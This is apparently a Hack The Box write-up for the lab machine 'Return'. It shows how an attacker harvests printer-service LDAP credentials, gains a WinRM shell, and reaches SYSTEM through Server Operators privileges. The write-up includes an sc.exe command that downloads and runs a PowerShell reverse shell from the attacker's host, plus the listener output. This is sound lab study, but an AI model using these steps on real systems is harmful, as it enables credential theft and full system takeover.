---
layout: post
title: HTB Return Writeup  
subtitle: Easy Box
thumbnail-img: /assets/img/return/logo.png
tags: [HTB]
---

# Notes
![Return](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/return/logo.png)


| Name | Return |
| :------ |:--- |
| OS | Windows |
| RELEASE DATE | 27 Sept 2021 |
| DIFFICULTY | Easy |

# About

Return is a machine from Hack The Box. This machine focuses on attacking an exposed printer configuration to gain WinRm credentials. To gain system we learn that we are a port of the "Server Operators" group that will let us escalate our privilege's by creating a new service that will give us a reverse shell

# Port Scan

IP: 10.10.11.108

```
PORT      STATE SERVICE       VERSION                                                                                                                                                        
53/tcp    open  domain        Simple DNS Plus                                                                                                                                                
80/tcp    open  http          Microsoft IIS httpd 10.0                                                                                                                                       
|_http-server-header: Microsoft-IIS/10.0                                                                                                                                                     
| http-methods:                                                                                                                                                                              
|_  Potentially risky methods: TRACE                                                                                                                                                         
|_http-title: HTB Printer Admin Panel                                                                                                                                                        
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-01-18 02:51:35Z)                                                                                                 
135/tcp   open  msrpc         Microsoft Windows RPC                                                                                                                                          
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn               
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?                                                                 
464/tcp   open  kpasswd5?                
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped                   
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped              
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found              
9389/tcp  open  mc-nmf        .NET Message Framing                                          
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0                                                                                                                                                  
|_http-title: Not Found                                                                                                                                                                      
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC              
49667/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC                                                                                                                                          
49674/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0    
49679/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
56124/tcp open  msrpc         Microsoft Windows RPC                  
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

```

There are lots of open ports and we can learn a few things from them.

1.  It is a windows machine
2.  It is running inside a Active Directory domain
    1.  Port 135/139/445 SMB
    2.  Port 88 Kerberos
    3.  Port 389/636 LDAP

We also see that it is running an IIS Webserver. Web servers generally have a big attack surface so I like to start there.

# HTTP Port 80

Clicking around I can see that it is running PHP from the url `http://10.10.11.108/index.php`

There is another page called "Settings". On the page, we can see that we have a Username of `svc-printer` and a password that is hidden. I tried to update the password but we can see that the request only updates the "Server Address" field

```
POST /settings.php HTTP/1.1
Host: 10.10.11.108
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 23
Origin: http://10.10.11.108
Connection: close
Referer: http://10.10.11.108/settings.php
Upgrade-Insecure-Requests: 1

ip=printer.return.local
```

Since we have control over the IP we can redirect the LDAP request to our kali machine harvesting the password. Instead of sending the LDAP request to return it will send it to us

![Return](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/return/1.png)

![Return](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/return/2.png)

# User Shell

Now that we have some credentials `svc-printer:1edFg43012!!` we can try and log into some services. The first one I'll try is WinRM using, if you don't have it installed you can easily do it by running `gem install evil-winrm`. As you can see below we get a session!

```
┌──(root💀kali)-[~/htb/return]
└─# evil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!'  

Evil-WinRM shell v3.3
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-printer\Documents>

```

From there we can change our directory to `C:\Users\svc-printer\Desktop` and get our user flag!

# nt authority\\system

Doing some basic privilege enumeration on our user we can see that we are a member of "Server Operators". Server operators can start and stop services as well as create them (with admin privileges). We can exploit this to elevate to system by creating a service that will download PowerShell reverse shell and execute it as system!

```
*Evil-WinRM* PS C:\Users\svc-printer\Desktop>  net user svc-printer 
User name                    svc-printer
Full Name                    SVCPrinter
Comment                      Service Account for Printer
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/26/2021 12:15:13 AM
Password expires             Never
Password changeable          5/27/2021 12:15:13 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   5/26/2021 12:39:29 AM

Logon hours allowed          All

Local Group Memberships      *Print Operators      *Remote Management Use
                             *Server Operators
Global Group memberships     *Domain Users

```

## PowerShell reverse shell

For my reverse shell I'll use nishang's "Invoke-PowerShellTcpOneLine.ps1". I uncommented the first one and added in my kali ip and port. https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1

Then I started up a python http server to allow Return to download it.
`python3 -m http.server 81`

I also started up a listener for our shell
`nc -lvnp 4444`

## Create new service and run

Next, we will run the following command to create a new service called "VSS" that will download our PowerShell reverse shell and run it

`sc.exe config VSS binpath="C:\Windows\System32\cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://YOUR IP:81/Invoke-PowerShellTcpOneLine.ps1')"`

Next we will run `sc.exe stop VSS` to stop the service
And finally, we will start it by executing `sc.exe start VSS`

We can see that it downloaded our reverse shell

```
┌──(root💀kali)-[~/htb/return]
└─# python3 -m http.server 81
Serving HTTP on 0.0.0.0 port 81 (http://0.0.0.0:81/) ...
10.10.11.108 - - [17/Jan/2022 22:11:09] "GET /Invoke-PowerShellTcpOneLine.ps1 HTTP/1.1" 200 -
```

And looking at our listener we have a shell at system

```
┌──(root💀kali)-[~/htb/return]
└─# nc -lvnp 4444           
listening on [any] 4444 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.11.108] 54589
whoami
nt authority\system
PS C:\Windows\system32> 
```
